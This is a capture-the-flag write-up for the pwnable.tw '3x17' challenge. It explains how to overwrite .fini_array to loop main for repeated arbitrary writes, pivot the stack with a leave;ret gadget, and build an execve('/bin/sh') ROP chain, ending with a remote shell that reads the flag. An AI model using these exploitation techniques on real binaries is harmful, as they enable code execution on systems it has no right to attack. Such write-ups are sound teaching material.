# 3x17

Stack pivoting, Overwriting .fini_array, rop2syscall

## checksec

```bash
[*] '/mnt/d/CTFs/pwnable-tw/3x17/3x17'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Since there is no PIE, the ROP gadgets and `.fini_array` are at fixed addresses. 

Although the checksec detects no canary, stack canaries exist on most of the functions in the binary, including `main`. 

## General Functionality of the Binary

The stripped, statically-linked x86-64 binary simply provides an one-time arb-write capability of 24 bytes (read in using the read syscall) before returning, as shown

```
$ ./3x17
addr:123456
data:bruh
```

An `atoll()` call is made on the user input to the  "addr:" prompt, while the binary accepts byte input after the "data:" prompt. Thus, the above user input would result in the writing of `b"bruh\n"` into the address `hex(123456) = 0x1e240`. 

We will need to overwrite `.fini_array` to obtain more arbtrary writes. 

### Structure of `.fini_array`

From Binary Ninja, we see that `.fini_array` basically consists of two function pointers, one to `__do_global_dtors_aux` and the other to some unidentified function `sub_401580`

```c
.fini_array section started  {0x4b40f0-0x4b4100}
004b40f0  void (* fini_array[0x2])() = 
004b40f0  {
004b40f0      [0x0] = __do_global_dtors_aux
004b40f8      [0x1] = sub_401580
004b4100  }
.fini_array section ended  {0x4b40f0-0x4b4100}
```

> Note: `.fini_array` refers to the section of memory in the ELF that holds the array of function that run on exit, while `fini_array` refers to the array of functions itself. 


Notably, the functions in `.fini_array` run in reverse order i.e. `fini_array[1]` will run before `fini_array[0]`. Hence when overwriting `.fini_array`, we should inject the function (or ROP gadget, but oops - that will require [stack pivoting](#stack-pivoting)) that should/can run first into the second entry of `fini_array`. 

## Obtaining more Arbitrary Writes

24 bytes of arb-write is insufficient for us to construct the ROP chain to spawn a shell through syscall-ing (not to mention we also need to overwrite `.fini_array`, and [pivot the stack](#stack-pivoting), the reason for which is explained in that section), so our first order of business is to obtain more arbitrary writes. 

To that end, we need to be able to continuously call `main`, so that we can repeatedly use the arb-write capability that the function grants us. 

At this point, we should note that within `main`, there is a global variable that is updated whenever the function runs. In the truncated High Level IL representation of `main` generated by Binary Ninja shown below, this is `data_4b9330` - the byte at address `0x4b9330` is incremented by 1 everytime `main` runs. 

```c
00401b6d  int64_t main()

              ... Setting up the stack canary ...

00401b8e      data_4b9330 = data_4b9330 + 1
00401b94      char rax_3 = data_4b9330
00401b9d      if (rax_3 == 1)
                  ... Perform the Arb-write ...

              ... Canary check ...
```

Only if the byte at address `0x4b9330` is 1, will we be able to arb-write. `data_4b9330` is initialized to zero, so on the second run of `main`, the arb-write capability won't occur. 

However, if we are able to overflow the byte at `0x4b9330`, then the arb-write capability will be re-attained. In other words, after the first occurrence, the arb-write capability will only reoccur every 256 calls to `main`. 

This implies that we cannot simply overwrite an entry in `fini_array` with `main` - we need a way of calling `main` a large number of times. 

### Calling `main` repeatedly

The libc function `__libc_csu_fini` is the function that calls the functions in `fini_array`. We can identify it (its address) by the fifth argument that is passed to `__libc_start_main` that is the first call from the binary's entrypoint. From the Binary Ninja High Level IL representation of `__libc_csu_fini` shown below, we verify that the function in `fini_array` are called from higher to lower indexes. 

```c
00402960  int64_t __libc_csu_fini()
0040297d      int64_t i = 1
00402994      do
00402988          fini_array[i]()
0040298c          i = i - 1
00402994      while (i != -1)
0040299c      return _fini() __tailcall
```

Notably, if `fini_array[1] = main` and `fini_array[0] = __libc_csu_fini`, then `main` will be continuously called, since `fini_array` would be

```c
004b40f0  void (* fini_array[0x2])() = 
004b40f0  {
004b40f0      [0x0] = __libc_csu_fini
004b40f8      [0x1] = main
004b4100  }
```

## Stack Pivoting 

To spawn a shell by rop2syscall, we need to inject ROP gadgets onto the stack (since retaddrs are popped off the stack). However, due to ASLR, we do not know the address of the stack and thus would need to leak its address to know where to arb-write to. Perhaps that is possible, but there is a simpler way to perform our rop2syscall, which is to pivot the stack to an address that is fixed (i.e. does not change between runs). 

Consider the disassembly of `__libc_csu_fini` up till its call 

```x86asm
00402960  int64_t __libc_csu_fini()

00402960  55                 push    rbp {__saved_rbp}
00402961  488d0598170b00     lea     rax, [rel data_4b4100]
00402968  488d2d81170b00     lea     rbp, [rel fini_array]
0040296f  53                 push    rbx {__saved_rbx}
00402970  4829e8             sub     rax, rbp
00402973  4883ec08           sub     rsp, 0x8
00402977  48c1f803           sar     rax, 0x3
0040297b  7419               je      0x402996  {0x0}

0040297d  488d58ff           lea     rbx, [rax-0x1]  {0x1}
00402981  0f1f8000000000     nop     dword [rax], eax

00402988  ff54dd00           call    qword [rbp+rbx*8]
```

Importantly, `rbp` is loaded with the address of `.fini_array` (instr 0x402968). This implies that we can use a very basic gadget (that is present in almost all x86-64 functions since that is the function epilogue) to pivot the stack - the `leave; ret` gadget. 

This technique is mentioned on [this site](https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting#leave-ret), but the basic idea is that the `leave` instr is the following two instrs

```x86asm
mov rsp, rbp
pop rbp
```

Thus, if we inject the `leave; ret` gadget into `fini_array[0]`, then after the `leave` rsp will be set to `fini_array`, and after the `ret` rsp will be `fini_array + 8`. The stack would be pivoted to `fini_array[1]`, after which we would know the addresses to write in further ROP gadgets (since the address of `.fini_array` is fixed because there is no PIE). 

In other words, if we setup the ROP chain to spawn a shell from `fini_array + 16` onwards, and let `fini_array[0]` be a `leave; ret` gadget and `fini_array[1]` be a `ret` gadget, then 

Notably, we **must** setup the rest of the ROP chain before pivoting the stack, because that would take away our arb-write capability, since both entries of `fini_array` are needed to [call `main` repeatedly](#calling-main-repeatedly). 

## The ROP chain

We use the following ROP chain to rop2syscall (creation mostly automated using pwntools)

```
0x0000:         0x44a309 pop rdx; pop rsi; ret
0x0008:              0x0
0x0010:              0x0
0x0018:         0x41e4af pop rax; ret
0x0020:             0x3b
0x0028:         0x401696 pop rdi; ret
0x0030:         0x4b7c70
0x0038:         0x4022b4 syscall
```

A separate arb-write to `0x4b7c70` (just some arbitrary address in .data) is done to write in the `b"/bin/sh\x00"` string. 

## Flag

```bash
[+] Opening connection to chall.pwnable.tw on port 10105: Done
[*] Loaded 131 cached gadgets for './3x17'
0x0000:         0x44a309 pop rdx; pop rsi; ret
0x0008:              0x0
0x0010:              0x0
0x0018:         0x41e4af pop rax; ret
0x0020:             0x3b
0x0028:         0x401696 pop rdi; ret
0x0030:         0x4b7c70
0x0038:         0x4022b4 syscall
[*] Switching to interactive mode
$ cd home/3x17
$ ls
3x17
run.sh
the_4ns_is_51_fl4g
$ cat the_4ns_is_51_fl4g
FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}
```